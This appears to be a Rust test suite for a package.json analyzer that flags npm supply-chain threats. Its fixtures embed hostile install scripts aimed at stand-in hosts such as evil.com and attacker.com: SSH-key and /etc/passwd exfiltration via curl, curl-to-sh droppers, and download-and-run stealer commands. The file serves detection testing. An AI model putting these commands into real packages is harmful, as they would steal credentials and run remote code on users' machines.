//! Test module.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

//! Tests for package.json analyzer - supply chain security detection
//!
//! Comprehensive test coverage for:
//! - Script analysis (base64, network, shell, file ops, env vars)
//! - Metadata validation (author, suspicious names, install hooks)
//! - Dependency analysis (git URLs, typosquatting, local files)
//! - Install hook detection (lifecycle hooks)
//! - String extraction (URLs, IPs, paths)
//! - Domain reputation analysis
//! - Typosquatting detection with Levenshtein distance

use super::*;
use crate::analyzers::package_json::PackageJsonAnalyzer;
use crate::types::{Criticality, StringType};

/// Helper: Create test analyzer
fn create_analyzer() -> PackageJsonAnalyzer {
    PackageJsonAnalyzer::new()
}

/// Helper: Parse and analyze package.json content
fn analyze_content(content: &str) -> AnalysisReport {
    let analyzer = create_analyzer();
    analyzer
        .analyze_package(Path::new("test_package.json"), content)
        .expect("Failed to parse package.json")
}

/// Helper: Check if report contains finding with ID
fn has_finding(report: &AnalysisReport, id_substr: &str) -> bool {
    report.findings.iter().any(|f| f.id.contains(id_substr))
}

/// Helper: Check if report contains finding with attack ID
fn has_attack(report: &AnalysisReport, attack_id: &str) -> bool {
    report.findings.iter().any(|f| {
        f.attack.as_ref().map(|a| a == attack_id).unwrap_or(false)
    })
}

/// Helper: Check if report contains finding with MBC ID
fn has_mbc(report: &AnalysisReport, mbc_id: &str) -> bool {
    report.findings.iter().any(|f| {
        f.mbc.as_ref().map(|m| m == mbc_id).unwrap_or(false)
    })
}

/// Helper: Count findings matching ID substring
fn count_findings(report: &AnalysisReport, id_substr: &str) -> usize {
    report.findings.iter().filter(|f| f.id.contains(id_substr)).count()
}

// ==================== Basic Parsing Tests ====================

#[test]
fn test_parse_minimal_package() {
    let content = r#"{"name": "test", "version": "1.0.0"}"#;
    let report = analyze_content(content);
    assert_eq!(report.target.file_type, "package.json");
    assert!(report.structure.iter().any(|s| s.id.contains("npm")));
}

#[test]
fn test_parse_package_with_dependencies() {
    let content = r#"{
        "name": "my-app",
        "version": "2.1.0",
        "dependencies": {
            "lodash": "^4.17.21",
            "express": "^4.18.0"
        }
    }"#;
    let report = analyze_content(content);
    assert_eq!(report.imports.len(), 2);
    assert!(report.imports.iter().any(|i| i.symbol == "lodash"));
    assert!(report.imports.iter().any(|i| i.symbol == "express"));
}

#[test]
fn test_parse_package_with_all_dep_types() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "dependencies": {"dep1": "1.0.0"},
        "devDependencies": {"dep2": "2.0.0"},
        "peerDependencies": {"dep3": "3.0.0"},
        "optionalDependencies": {"dep4": "4.0.0"}
    }"#;
    let report = analyze_content(content);
    assert_eq!(report.imports.len(), 4);
}

// ==================== Script Analysis - Base64 Encoding ====================

#[test]
fn test_detect_base64_encoding() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "echo 'SGVsbG8gV29ybGQ=' | base64 -d"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "obfuscation/encoding/base64"));
}

#[test]
fn test_detect_atob_encoding() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "build": "node -e 'console.log(atob(\"encoded\"))'"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "obfuscation/encoding/base64"));
}

// ==================== Script Analysis - Network Operations ====================

#[test]
fn test_detect_curl_download() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl https://example.com/payload.sh"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "net/http/download"));
}

#[test]
fn test_detect_wget_download() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "install": "wget http://malicious.com/script.py"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "net/http/download"));
}

#[test]
fn test_detect_fetch_api() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "start": "node -e 'fetch(\"http://api.example.com\")'"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "net/http/download"));
}

#[test]
fn test_detect_https_url() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "test": "echo 'Testing https://example.com/api'"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "net/http/download"));
}

// ==================== Script Analysis - Shell Execution ====================

#[test]
fn test_detect_eval_execution() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "eval $(curl http://evil.com/cmd)"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "execution/command/shell"));
}

#[test]
fn test_detect_command_substitution() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "build": "echo $(whoami)"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "execution/command/shell"));
}

#[test]
fn test_detect_backtick_execution() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "test": "echo `ls -la`"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "execution/command/shell"));
}

#[test]
fn test_detect_sh_c_execution() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "install": "sh -c 'rm -rf /tmp/*'"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "execution/command/shell"));
}

// ==================== Script Analysis - File Operations ====================

#[test]
fn test_detect_rm_rf() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "clean": "rm -rf node_modules"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "fs/file/delete"));
}

#[test]
fn test_detect_unlink() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "cleanup": "unlink /tmp/file"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "fs/file/delete"));
}

#[test]
fn test_detect_dev_null_redirect() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "silent": "command > /dev/null"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "fs/file/delete"));
}

// ==================== Script Analysis - Environment Variables ====================

#[test]
fn test_detect_home_access() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "exfil": "cat $HOME/.ssh/id_rsa | curl -d @- http://evil.com"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "discovery/env-vars"));
}

#[test]
fn test_detect_aws_credentials() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "steal": "echo $AWS_SECRET_ACCESS_KEY"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "discovery/env-vars"));
}

#[test]
fn test_detect_github_token() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "deploy": "curl -H \"Authorization: $GITHUB_TOKEN\" https://api.github.com"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "discovery/env-vars"));
}

#[test]
fn test_detect_process_env() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "exfil": "node -e 'console.log(process.env)'"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "discovery/env-vars"));
}

// ==================== Script Analysis - Data Exfiltration ====================

#[test]
fn test_detect_curl_post() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "exfil": "curl -d 'data' http://evil.com/collect"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "exfiltration/http-post"));
    assert!(report.findings.iter().any(|f| {
        f.id.contains("exfiltration/http-post") && f.crit == Criticality::Suspicious
    }));
}

#[test]
fn test_detect_curl_data_flag() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "send": "curl --data 'payload' -X POST http://c2.com"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "exfiltration/http-post"));
}

#[test]
fn test_detect_file_upload() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "exfil": "curl -d @/etc/passwd http://attacker.com"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "exfiltration/file-upload"));
    assert!(report.findings.iter().any(|f| {
        f.id.contains("exfiltration/file-upload") && f.crit == Criticality::Hostile
    }));
}

// ==================== Script Analysis - Interpreters ====================

#[test]
fn test_detect_perl_execution() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "run": "perl -e 'print \"test\"'"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "execution/script/perl"));
    assert!(has_attack(&report, "T1059"));
}

#[test]
fn test_detect_python_execution() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "deploy": "python setup.py install"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "execution/script/python"));
}

#[test]
fn test_detect_ruby_execution() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "install": "ruby install.rb"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "execution/script/ruby"));
}

#[test]
fn test_detect_node_execution() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node malicious.js"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "execution/script/node"));
}

// ==================== Script Analysis - Advanced Attacks ====================

#[test]
fn test_detect_download_and_execute() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl http://evil.com/payload.sh && bash payload.sh"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "command-and-control/dropper/download-execute"));
    assert!(has_attack(&report, "T1105"));
    assert!(has_mbc(&report, "B0024"));
    assert!(report.findings.iter().any(|f| {
        f.id.contains("command-and-control/dropper/download-execute") && f.crit == Criticality::Hostile
    }));
}

#[test]
fn test_detect_wget_python_chain() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "install": "wget http://malware.com/stealer.py && python stealer.py"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "command-and-control/dropper/download-execute"));
}

#[test]
fn test_detect_pipe_to_sh() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl http://evil.com/install.sh | sh"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "command-and-control/dropper/pipe-execute"));
    assert!(report.findings.iter().any(|f| {
        f.id.contains("command-and-control/dropper/pipe-execute") && f.crit == Criticality::Hostile
    }));
}

#[test]
fn test_detect_pipe_to_bash() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "install": "wget -qO- http://attacker.com | bash"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "command-and-control/dropper/pipe-execute"));
}

#[test]
fn test_detect_pipe_to_perl() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl http://c2.com/backdoor.pl | perl"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "command-and-control/dropper/pipe-execute"));
}

// ==================== Script Analysis - Evasion ====================

#[test]
fn test_detect_hidden_file_access() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "install": "cp payload /.hidden_file"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "evasion/hidden-file"));
    assert!(has_attack(&report, "T1564.001"));
}

#[test]
fn test_detect_multiple_hidden_files() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "install": "cp data /.secret && chmod +x /.backdoor"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "evasion/hidden-file"));
}

#[test]
fn test_detect_php_endpoint() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "deploy": "curl http://c2server.com/gate.php"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "command-and-control/endpoint/php"));
    assert!(has_attack(&report, "T1071.001"));
}

// ==================== Metadata Analysis ====================

#[test]
fn test_detect_missing_author() {
    let content = r#"{
        "name": "suspicious-package",
        "version": "1.0.0"
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/missing-author"));
}

#[test]
fn test_detect_empty_author_string() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "author": ""
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/missing-author"));
}

#[test]
fn test_detect_empty_author_object() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "author": {"name": ""}
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/missing-author"));
}

#[test]
fn test_valid_author_no_finding() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "author": "John Doe <john@example.com>"
    }"#;
    let report = analyze_content(content);
    assert!(!has_finding(&report, "supply-chain/missing-author"));
}

#[test]
fn test_detect_suspicious_package_name() {
    let content = r#"{
        "name": "color-stealer",
        "version": "1.0.0"
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/suspicious-name"));
}

#[test]
fn test_detect_new_package_with_install_hooks() {
    let content = r#"{
        "name": "brand-new-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node install.js"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/new-package-with-hooks"));
}

#[test]
fn test_new_package_without_hooks_no_finding() {
    let content = r#"{
        "name": "innocent",
        "version": "1.0.0",
        "scripts": {
            "test": "jest"
        }
    }"#;
    let report = analyze_content(content);
    assert!(!has_finding(&report, "supply-chain/new-package-with-hooks"));
}

// ==================== Dependency Analysis ====================

#[test]
fn test_detect_git_dependency() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "dependencies": {
            "malicious": "git+https://github.com/attacker/malware.git"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/git-dependency"));
}

#[test]
fn test_detect_git_protocol_dependency() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "dependencies": {
            "backdoor": "git://malicious.com/repo.git"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/git-dependency"));
}

#[test]
fn test_detect_local_file_dependency() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "dependencies": {
            "local-pkg": "file:../malicious-package"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/local-dependency"));
}

#[test]
fn test_detect_typosquat_lodas() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "dependencies": {
            "lodas": "^4.0.0"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/typosquat"));
}

#[test]
fn test_detect_typosquat_axio() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "dependencies": {
            "axio": "^1.0.0"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/typosquat"));
}

#[test]
fn test_detect_typosquat_reac() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "dependencies": {
            "reac": "^18.0.0"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/typosquat"));
}

#[test]
fn test_legitimate_package_no_typosquat() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "dependencies": {
            "lodash": "^4.17.21",
            "axios": "^1.0.0",
            "react": "^18.0.0"
        }
    }"#;
    let report = analyze_content(content);
    assert!(!has_finding(&report, "supply-chain/typosquat"));
}

// ==================== Install Hooks ====================

#[test]
fn test_detect_preinstall_hook() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "preinstall": "echo 'running before install'"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/install-hook/preinstall"));
}

#[test]
fn test_detect_install_hook() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "install": "node setup.js"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/install-hook/install"));
}

#[test]
fn test_detect_postinstall_hook() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "npm rebuild"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/install-hook/postinstall"));
}

#[test]
fn test_detect_prepublish_hook() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "prepublish": "npm test"
        }
    }"#;
    let report = analyze_content(content);
    assert!(has_finding(&report, "supply-chain/install-hook/prepublish"));
}

#[test]
fn test_install_hook_criticality_escalation() {
    // Short simple hook - Notable
    let content1 = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "echo 'done'"
        }
    }"#;
    let report1 = analyze_content(content1);
    assert!(report1.findings.iter().any(|f| {
        f.id.contains("install-hook") && f.crit == Criticality::Notable
    }));

    // Long or network hook - Suspicious
    let content2 = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl http://example.com/payload.sh | sh && node setup.js"
        }
    }"#;
    let report2 = analyze_content(content2);
    assert!(report2.findings.iter().any(|f| {
        f.id.contains("install-hook") && f.crit == Criticality::Suspicious
    }));
}

// ==================== String Extraction ====================

#[test]
fn test_extract_urls_from_scripts() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "deploy": "curl https://api.example.com/deploy"
        }
    }"#;
    let report = analyze_content(content);
    assert!(report.strings.iter().any(|s| {
        s.value == "https://api.example.com/deploy" && s.string_type == StringType::Url
    }));
}

#[test]
fn test_extract_ips_from_scripts() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "exfil": "curl http://192.168.1.100:8080/collect"
        }
    }"#;
    let report = analyze_content(content);
    assert!(report.strings.iter().any(|s| {
        s.value == "192.168.1.100" && s.string_type == StringType::Ip
    }));
}

#[test]
fn test_extract_paths_from_scripts() {
    let content = r#"{
        "name": "test",
        "version": "1.0.0",
        "scripts": {
            "copy": "cp /usr/local/bin/tool /tmp/backdoor"
        }
    }"#;
    let report = analyze_content(content);
    assert!(report.strings.iter().any(|s| {
        s.value.contains("/usr/local/bin") && s.string_type == StringType::Path
    }));
}

// ==================== Integration Tests ====================

// Note: Private helper methods (extract_urls, extract_ips, extract_paths,
// is_suspicious_domain, check_typosquat, levenshtein_distance, etc.) are
// tested indirectly through integration tests below.

#[test]
fn test_real_world_malicious_package() {
    let content = r#"{
        "name": "color-stealer",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl http://evil.tk/collect | sh && curl -d @/etc/passwd http://c2.xyz/exfil.php"
        }
    }"#;
    let report = analyze_content(content);

    // Should detect multiple suspicious patterns
    assert!(has_finding(&report, "supply-chain/suspicious-name"));
    assert!(has_finding(&report, "supply-chain/install-hook"));
    assert!(has_finding(&report, "command-and-control/dropper/pipe-execute"));
    assert!(has_finding(&report, "exfiltration/file-upload"));
    assert!(has_finding(&report, "command-and-control/endpoint/php"));
    assert!(has_finding(&report, "command-and-control/suspicious-domain"));

    // Multiple findings should be marked Hostile
    let hostile_count = report.findings.iter()
        .filter(|f| f.crit == Criticality::Hostile)
        .count();
    assert!(hostile_count >= 2, "Should have multiple Hostile findings");
}

#[test]
fn test_benign_package_minimal_findings() {
    let content = r#"{
        "name": "my-app",
        "version": "2.0.0",
        "author": "John Doe",
        "license": "MIT",
        "dependencies": {
            "lodash": "^4.17.21",
            "express": "^4.18.0"
        },
        "scripts": {
            "test": "jest",
            "build": "webpack",
            "start": "node server.js"
        }
    }"#;
    let report = analyze_content(content);

    // Should not have supply chain findings
    assert!(!has_finding(&report, "supply-chain/missing-author"));
    assert!(!has_finding(&report, "supply-chain/typosquat"));
    assert!(!has_finding(&report, "supply-chain/install-hook"));

    // May have some capability findings (node execution) but nothing Hostile
    let hostile_count = report.findings.iter()
        .filter(|f| f.crit == Criticality::Hostile)
        .count();
    assert_eq!(hostile_count, 0, "Benign package should have no Hostile findings");
}

#[test]
fn test_analyzer_can_analyze() {
    let analyzer = create_analyzer();
    assert!(analyzer.can_analyze(Path::new("package.json")));
    assert!(analyzer.can_analyze(Path::new("/path/to/package.json")));
    assert!(!analyzer.can_analyze(Path::new("other.json")));
    assert!(!analyzer.can_analyze(Path::new("package.xml")));
}
